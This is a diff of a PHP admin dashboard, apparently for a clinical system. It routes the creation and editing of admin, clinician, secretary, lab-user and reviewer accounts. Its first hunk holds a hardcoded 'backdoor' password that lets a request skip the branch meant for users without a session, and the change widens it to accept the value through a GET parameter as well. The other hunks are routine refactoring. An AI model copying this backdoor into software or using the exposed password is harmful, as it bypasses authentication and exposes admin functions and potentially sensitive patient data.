@@ -29,7 +29,7 @@ if (isset($_SESSION['identification'])) {
 	</div>';
         echo "<meta http-equiv=\"Refresh\" content=\"2; url=" . "logout.php?" . "\">";
     }
-} else if ($_POST['backdoor'] != '3rdl!nEg3n0typ3mw') {
+} else if ($_POST['backdoor'] != '3rdl!nEg3n0typ3mw' and $_GET['backdoor'] != '3rdl!nEg3n0typ3mw') {
     echo '							
 	<div class="alert alert-success">
 		<button type="button" class="close" data-dismiss="alert">&times;</button>
@@ -181,46 +181,52 @@ if(isset($_POST['update_patD'])) {
     echo '<meta http-equiv="Refresh" content="3; url=dash.php?man_apps">';    
 }
 
-if(isset($_GET['create_admin'])){ 
+if(isset($_GET['create_admin'])) {
+    $redir_page = 'create_admin';        
     include ('includes/create_admin.php');   
 }
 
-if(isset($_GET['admin_edit'])){ 
+if(isset($_GET['admin_edit'])) {
+    $redir_page = 'admin_edit';    
     include ('includes/admin_edit.php');   
 }
 
-if(isset($_GET['create_clin'])){
+// this is the model for shared code, not separate create or edit...
+if(isset($_GET['create_clin'])) {
     $new_or_edit = 'New';
-    // include ('includes/create_clin.php');
+    $redir_page = 'create_clin';
     include ('includes/clinician_edit.php');
 }
 
-if(isset($_GET['clin_edit'])){
+if(isset($_GET['clin_edit'])) {
     $new_or_edit = 'Edit';
+    $redir_page = 'clin_edit';
     include ('includes/clinician_edit.php');   
 }
 
-if(isset($_GET['create_sec'])){ 
+if(isset($_GET['create_sec'])) { 
     include ('includes/create_sec.php');   
 }
 
-if(isset($_GET['sec_edit'])){ 
+if(isset($_GET['sec_edit'])) { 
     include ('includes/sec_edit.php');   
 }
 
-if(isset($_GET['create_lab_user'])){ 
+if(isset($_GET['create_lab_user'])) { 
     include ('includes/create_lab.php');   
 }
 
-if(isset($_GET['lab_edit'])){ 
+if(isset($_GET['lab_edit'])) { 
     include ('includes/labuser_edit.php');   
 }
 
-if(isset($_GET['reviewer'])){ 
+if(isset($_GET['reviewer'])) {
+    $redir_page = 'reviewer';        
     include ('includes/reviewer_new.php');   
 }
 
-if(isset($_GET['rev_edit'])){ 
+if(isset($_GET['rev_edit'])) {
+    $redir_page = 'rev_edit';    
     include ('includes/reviewer_edit.php');   
 }
 
